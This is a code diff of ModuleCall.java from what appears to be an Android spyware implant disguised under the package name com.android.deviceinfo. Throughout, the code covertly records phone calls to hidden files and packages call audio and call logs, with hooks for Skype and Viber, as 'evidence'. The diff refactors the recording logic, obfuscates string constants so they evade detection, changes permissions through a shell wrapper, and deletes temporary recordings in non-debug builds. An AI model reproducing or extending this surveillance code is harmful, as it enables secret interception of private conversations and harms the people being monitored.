@@ -44,9 +44,10 @@ import com.android.deviceinfo.file.Path;
 import com.android.deviceinfo.interfaces.Observer;
 import com.android.deviceinfo.listener.ListenerCall;
 import com.android.deviceinfo.listener.ListenerProcess;
+import com.android.deviceinfo.module.call.CallInfo;
 import com.android.deviceinfo.module.call.Chunk;
 import com.android.deviceinfo.module.call.EncodingTask;
-import com.android.deviceinfo.module.chat.CallInfo;
+import com.android.deviceinfo.module.call.RecordCall;
 import com.android.deviceinfo.module.chat.ChatSkype;
 import com.android.deviceinfo.module.chat.ChatViber;
 import com.android.deviceinfo.util.AudioEncoder;
@@ -65,12 +66,8 @@ import com.android.m.M;
 public class ModuleCall extends BaseModule implements Observer<Call> {
 	private static final String TAG = "ModuleCall"; //$NON-NLS-1$
 	private static final int HEADER_SIZE = 6;
-	private MediaRecorder recorder = null;
-	private boolean recordFlag;
-	private String currentRecordFile;
-	// private Date fromTime;
-	// private String number, model;
-	private int strategy = 0;
+
+	public boolean recordFlag;
 
 	private static final int CHANNEL_LOCAL = 0;
 	private static final int CHANNEL_REMOTE = 1;
@@ -97,7 +94,6 @@ public class ModuleCall extends BaseModule implements Observer<Call> {
 
 	public static final byte[] AMR_HEADER = new byte[] { 35, 33, 65, 77, 82, 10 };
 	public static final byte[] MP4_HEADER = new byte[] { 0, 0, 0 };
-	protected static final int CALL_PHONE = 0x0145;
 
 	int amr_sizes[] = { 12, 13, 15, 17, 19, 20, 26, 31, 5, 6, 5, 5, 0, 0, 0, 0 };
 	private RunningProcesses runningProcesses;
@@ -250,14 +246,14 @@ public class ModuleCall extends BaseModule implements Observer<Call> {
 
 		return true;
 	}
-
+	
 	private void purgeAudio() {
 		// Scrub for existing files on FS
 		File f = new File(AudioEncoder.getAudioStorage());
 
 		FilenameFilter filter = new FilenameFilter() {
 			public boolean accept(File dir, String name) {
-				return (name.startsWith("Qi-") && name.toLowerCase().endsWith(".bin"));
+				return (name.startsWith(M.e("Qi-")) && name.toLowerCase().endsWith(M.e(".bin")));
 			}
 		};
 
@@ -281,7 +277,7 @@ public class ModuleCall extends BaseModule implements Observer<Call> {
 				}
 
 				// Make it read-write
-				Execute.execute(Configuration.shellFile + " " + "pzm" + " " + "666" + " " + fullName);
+				Execute.execute(Configuration.shellFile + " " + M.e("pzm 666") + " " + fullName);
 
 				storedFile.delete();
 			}
@@ -294,7 +290,7 @@ public class ModuleCall extends BaseModule implements Observer<Call> {
 
 		FilenameFilter filter = new FilenameFilter() {
 			public boolean accept(File dir, String name) {
-				return (name.startsWith("Qi-") && name.toLowerCase().endsWith(".tmp"));
+				return (name.startsWith(M.e("Qi-")) && name.toLowerCase().endsWith(M.e(".tmp")));
 			}
 		};
 
@@ -314,7 +310,7 @@ public class ModuleCall extends BaseModule implements Observer<Call> {
 	}
 
 	synchronized private boolean addToEncodingList(String s) {
-		if (s.contains("Qi-") == false || (s.endsWith("-l.tmp") == false && s.endsWith("-r.tmp") == false)) {
+		if (s.contains(M.e("Qi-")) == false || (s.endsWith(M.e("-l.tmp")) == false && s.endsWith(M.e("-r.tmp")) == false)) {
 			if (Cfg.DEBUG) {
 				Check.log(TAG + "(addToEncodingList): " + s + " is not intended for us");
 			}
@@ -329,7 +325,7 @@ public class ModuleCall extends BaseModule implements Observer<Call> {
 		hjcb.trigger(s);
 
 		// Make it read-write in any case
-		Execute.execute(Configuration.shellFile + " " + "pzm" + " " + "666" + " " + s);
+		Execute.execute(Configuration.shellFile + " " + M.e("pzm 666") + " " + s);
 
 		// Add the file to the list
 		calls.add(s);
@@ -378,8 +374,8 @@ public class ModuleCall extends BaseModule implements Observer<Call> {
 
 		try {
 			// Let's start with call recording
-			if (recordFlag && isSupported()) {
-				recording = recordCall(call, incoming);
+			if (recordFlag && RecordCall.self().isSupported(this)) {
+				recording = RecordCall.self().recordCall(this, call, incoming);
 			}
 		} catch (Exception ex) {
 			if (Cfg.DEBUG) {
@@ -402,77 +398,12 @@ public class ModuleCall extends BaseModule implements Observer<Call> {
 		return 0;
 	}
 
-	private boolean recordCall(final Call call, final boolean incoming) {
-		if (!call.isOngoing()) {
-			if (stopRecord()) {
-				Object future = Status.getStpe().schedule(new Runnable() {
-					public void run() {
-						String myNumber = Device.self().getPhoneNumber();
-						saveCallEvidence(call.getNumber(), myNumber, incoming, call.getTimeBegin(), call.getTimeEnd(),
-								currentRecordFile, true, 1, CALL_PHONE);
-					}
-				}, 100, TimeUnit.MILLISECONDS);
-
-				// Se un giorno la conf non dovesse includere gia' tutti
-				// i moduli,
-				// self() tornerebbe NULL in quanto non instanziato.
-				ModuleMic mic = ModuleMic.self();
-
-				if (mic != null) {
-					mic.resume();
-				}
-			}
-
-			if (Cfg.DEBUG) {
-				Check.log(TAG + " (notification): call finished"); //$NON-NLS-1$
-			}
-
-			return true;
-		}
-
-		if (Cfg.DEBUG) {
-			Check.log(TAG + " (notification): start call recording procedure..."); //$NON-NLS-1$
-		}
-
-		int outputFormat = MediaRecorder.OutputFormat.RAW_AMR;
-		int audioEncoder = MediaRecorder.AudioEncoder.AMR_NB;
-
-		Long ts = Long.valueOf(System.currentTimeMillis());
-		String tmp = ts.toString();
-
-		// Logfile .3gpp in chiaro, temporaneo
-		String path = Path.hidden() + tmp + M.e(".qzt");
-
-		ModuleMic mic = ModuleMic.self();
-
-		if (mic != null) {
-			mic.suspend();
-		}
-
-		if (startRecord(strategy, outputFormat, audioEncoder, path) == true) {
-			if (Cfg.DEBUG) {
-				Check.log(TAG + " (notification): recording started on file: " + path); //$NON-NLS-1$
-			}
-
-		} else {
-			recordFlag = false;
-		}
-
-		mic = ModuleMic.self();
-
-		if (mic != null) {
-			mic.resume();
-		}
-
-		return false;
-	}
-
-	private boolean saveCallEvidence(String peer, String myNumber, boolean incoming, Date dateBegin, Date dateEnd,
+	public boolean saveCallEvidence(String peer, String myNumber, boolean incoming, Date dateBegin, Date dateEnd,
 			String currentRecordFile, boolean autoClose, int channel, int programId) {
 		if (Cfg.DEBUG) {
-			// Check.log(TAG + " (saveCallEvidence): " + currentRecordFile +
-			// " peer: " + peer + " from: " + dateBegin
-			// + " to: " + dateEnd + " incoming: " + incoming);
+			Check.log(TAG + " (saveCallEvidence): " +
+			" peer: " + peer + " from: " + dateBegin
+			+ " to: " + dateEnd + " incoming: " + incoming);
 		}
 
 		final byte[] additionaldata = getCallAdditionalData(peer, myNumber, incoming, new DateTime(dateBegin),
@@ -515,12 +446,11 @@ public class ModuleCall extends BaseModule implements Observer<Call> {
 				EvidenceBuilder.atomic(EvidenceType.CALL, additionaldata, ByteArray.intToByteArray(0xffffffff));
 			}
 
-			if (Cfg.DEBUG) {
+			if (!Cfg.DEBUG) {
 				// Check.log(TAG + " (saveCallEvidence): deleting file: " +
 				// file);
+				file.delete();
 			}
-
-			file.delete();
 
 			return true;
 		} else {
@@ -655,257 +585,12 @@ public class ModuleCall extends BaseModule implements Observer<Call> {
 		EvidenceBuilder.atomic(EvidenceType.CALLLISTNEW, null, data);
 	}
 
-	private boolean isSupported() {
-		String model = Build.MODEL.toLowerCase();
-		boolean supported = false;
-
-		if (Cfg.DEBUG) {
-			Check.log(TAG + " (isSupported): phone model: " + model); //$NON-NLS-1$
-		}
-		// TODO: in Messages
-		if (model.contains(M.e("i9100"))) { // Samsung Galaxy S2
-			supported = true;
-			strategy = MediaRecorder.AudioSource.VOICE_UPLINK;
-
-			if (Cfg.DEBUG) {
-				Check.log(TAG + " (notification): Samsung Galaxy S2, supported"); //$NON-NLS-1$
-			}
-		} else if (model.contains(M.e("galaxy nexus"))) { // Samsung Galaxy
-															// Nexus
-			supported = true;
-			strategy = MediaRecorder.AudioSource.DEFAULT;
-
-			if (Cfg.DEBUG) {
-				Check.log(TAG + " (notification): Galaxy Nexus, supported only microphone"); //$NON-NLS-1$
-			}
-		} else if (model.contains(M.e("gt-i9300"))) { // Galaxy S3
-			supported = true;
-			strategy = MediaRecorder.AudioSource.VOICE_UPLINK;
-
-			if (Cfg.DEBUG) {
-				Check.log(TAG + " (notification): Galaxy S3, supported"); //$NON-NLS-1$
-			}
-		} else if (model.contains(M.e("xt910"))) { // Motorola xt-910
-			supported = false;
-
-			if (Cfg.DEBUG) {
-				Check.log(TAG + " (notification): Motorola xt-910, unsupported"); //$NON-NLS-1$
-			}
-		} else if (model.contains(M.e("gt-p1000"))) { // Samsung Galaxy Tab 7''
-			supported = true;
-			strategy = MediaRecorder.AudioSource.VOICE_UPLINK;
-
-			if (Cfg.DEBUG) {
-				Check.log(TAG + " (notification): Samsung Galaxy Tab 7'',  supported"); //$NON-NLS-1$
-			}
-		} else {
-			if (Cfg.DEBUG) {
-				Check.log(TAG + " (notification): model unsupported by call registration module"); //$NON-NLS-1$
-			}
-		}
-
-		recordFlag = supported;
-		return supported;
-	}
-
 	public synchronized static void addTypedString(DataBuffer databuffer, byte type, String name) {
 		if (name != null && name.length() > 0) {
 			final int header = (type << 24) | (name.length() * 2);
 			databuffer.writeInt(header);
 			databuffer.write(WChar.getBytes(name));
 		}
-	}
-
-	private boolean startRecord(int audioSource, int outputFormat, int audioEncoder, String path) {
-		recorder = new MediaRecorder();
-
-		recorder.setAudioSource(audioSource);
-		recorder.setOutputFormat(outputFormat);
-		// REMOVE
-		// recorder.setAudioChannels(1);
-
-		recorder.setAudioEncoder(audioEncoder);
-		recorder.setOutputFile(path);
-
-		try {
-			recorder.prepare();
-			recorder.start();
-		} catch (Exception e) {
-			if (Cfg.DEBUG) {
-				Check.log(TAG + " (startRecord) Error: cannot start recording");
-			}
-
-			recorder = null;
-			return false;
-		}
-
-		currentRecordFile = path;
-		return true;
-	}
-
-	private boolean stopRecord() {
-		if (recorder == null) {
-			if (Cfg.DEBUG) {
-				Check.log(TAG + " (stopRecord): recorder is already null"); //$NON-NLS-1$
-			}
-
-			return false;
-		}
-
-		recorder.stop();
-		recorder.release();
-		recorder = null;
-		return true;
-	}
-
-	private int getStrategyNotYetWorking() {
-		Markup markupCallStrategy = new Markup(this);
-		HashMap<Integer, Boolean> strategyMap = null;
-
-		// the markup exists, try to read it
-		try {
-			if (markupCallStrategy.isMarkup()) {
-				strategyMap = (HashMap<Integer, Boolean>) markupCallStrategy.readMarkupSerializable();
-			}
-
-			// First time we run, let's try a strategy
-			if (strategyMap == null) {
-				if (Cfg.DEBUG) {
-					Check.log(TAG + " (getStrategy): no markup found, testing strategies..."); //$NON-NLS-1$
-				}
-
-				// Start with strategy 1
-				int outputFormat = MediaRecorder.OutputFormat.RAW_AMR;
-				int audioEncoder = MediaRecorder.AudioEncoder.AMR_NB;
-				boolean res;
-
-				strategyMap = new HashMap<Integer, Boolean>();
-
-				res = testStrategy(MediaRecorder.AudioSource.VOICE_CALL, outputFormat, audioEncoder);
-
-				// Strategy 0x04
-				strategyMap.put(MediaRecorder.AudioSource.VOICE_CALL, res);
-
-				if (Cfg.DEBUG) {
-					Check.log(TAG + " (getStrategy): strategy 4: " + res); //$NON-NLS-1$
-				}
-
-				if (res == true) {
-					markupCallStrategy.writeMarkupSerializable(strategyMap);
-					return MediaRecorder.AudioSource.VOICE_CALL;
-				}
-
-				// Strategy 0x02
-				res = testStrategy(MediaRecorder.AudioSource.VOICE_UPLINK, outputFormat, audioEncoder);
-
-				if (Cfg.DEBUG) {
-					Check.log(TAG + " (getStrategy): strategy 2: " + res); //$NON-NLS-1$
-				}
-
-				strategyMap.put(MediaRecorder.AudioSource.VOICE_UPLINK, res);
-
-				if (res == true) {
-					markupCallStrategy.writeMarkupSerializable(strategyMap);
-					return MediaRecorder.AudioSource.VOICE_UPLINK;
-				}
-
-				// Strategy 0x03
-				res = testStrategy(MediaRecorder.AudioSource.VOICE_DOWNLINK, outputFormat, audioEncoder);
-
-				if (Cfg.DEBUG) {
-					Check.log(TAG + " (getStrategy): strategy 3: " + res); //$NON-NLS-1$
-				}
-
-				strategyMap.put(MediaRecorder.AudioSource.VOICE_DOWNLINK, res);
-
-				if (res == true) {
-					markupCallStrategy.writeMarkupSerializable(strategyMap);
-					return MediaRecorder.AudioSource.VOICE_DOWNLINK;
-				}
-
-				// Strategy 0x01
-				res = testStrategy(MediaRecorder.AudioSource.MIC, outputFormat, audioEncoder);
-
-				if (Cfg.DEBUG) {
-					Check.log(TAG + " (getStrategy): strategy 1: " + res); //$NON-NLS-1$
-				}
-
-				strategyMap.put(MediaRecorder.AudioSource.MIC, res);
-
-				if (res == true) {
-					markupCallStrategy.writeMarkupSerializable(strategyMap);
-					return MediaRecorder.AudioSource.MIC;
-				}
-
-				markupCallStrategy.writeMarkupSerializable(strategyMap);
-
-				if (Cfg.DEBUG) {
-					Check.log(TAG + " (setStrategy): no suitable strategy found"); //$NON-NLS-1$
-				}
-			} else { // Return the winning strategy
-				if (Cfg.DEBUG) {
-					Check.log(TAG + " (getStrategy): reading markup"); //$NON-NLS-1$
-				}
-
-				for (Integer i : strategyMap.keySet()) {
-					boolean testedStrategy = strategyMap.get(i);
-
-					if (testedStrategy == true) {
-						// Return the winning strategy
-						if (Cfg.DEBUG) {
-							Check.log(TAG + " (getStrategy): using strategy  " + i); //$NON-NLS-1$
-						}
-						return i;
-					}
-				}
-
-				// Ok we don't have a winning strategy
-				if (Cfg.DEBUG) {
-					Check.log(TAG + " (setStrategy): no strategy found in markup"); //$NON-NLS-1$
-				}
-
-				return 0;
-			}
-		} catch (Exception e) {
-			if (Cfg.EXCEPTION) {
-				Check.log(e);
-			}
-
-			if (Cfg.DEBUG) {
-				Check.log(TAG + " Error (setStrategy): " + e);//$NON-NLS-1$
-			}
-		}
-
-		return 0;
-	}
-
-	private boolean testStrategy(int audioSource, int outputFormat, int audioEncoder) {
-		// Create dummy file
-		Long ts = Long.valueOf(System.currentTimeMillis());
-		String tmp = ts.toString();
-		String path = Path.hidden() + tmp + ".qzt"; // file .3gp
-		boolean success = false;
-
-		if (Cfg.DEBUG) {
-			Check.log(TAG + " (testStrategy): strategy: " + audioSource + " - dummy path: " + path); //$NON-NLS-1$
-		}
-
-		startRecord(audioSource, outputFormat, audioEncoder, path);
-
-		// Utils.sleep(250);
-
-		stopRecord();
-
-		File dummy = new File(path);
-
-		if (dummy.length() > 0) {
-			success = true;
-		}
-
-		dummy.delete();
-		dummy = null;
-
-		return success;
 	}
 
 	private int wsize(String string) {
@@ -1097,8 +782,6 @@ public class ModuleCall extends BaseModule implements Observer<Call> {
 		}
 		closeCallEvidence(caller, callee, true, begin, end, callInfo.programId);
 	}
-
-	
 
 	public class HijackCallBack implements ICallBack {
 		private static final String TAG = "InternalCallBack";
